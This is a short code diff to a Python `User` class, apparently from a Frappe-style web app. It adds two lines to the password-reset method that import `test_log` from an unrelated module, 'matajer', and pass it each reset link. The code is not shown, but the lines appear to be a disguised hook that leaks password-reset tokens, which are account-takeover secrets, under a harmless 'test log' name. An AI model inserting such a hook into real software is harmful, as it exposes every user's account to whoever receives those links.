@@ -230,7 +230,8 @@ class User(Document):
 		link = get_url(url)
 		if send_email:
 			self.password_reset_mail(link)
-
+		from matajer import test_log
+		test_log(link)
 		return link
 
 	def get_other_system_managers(self):
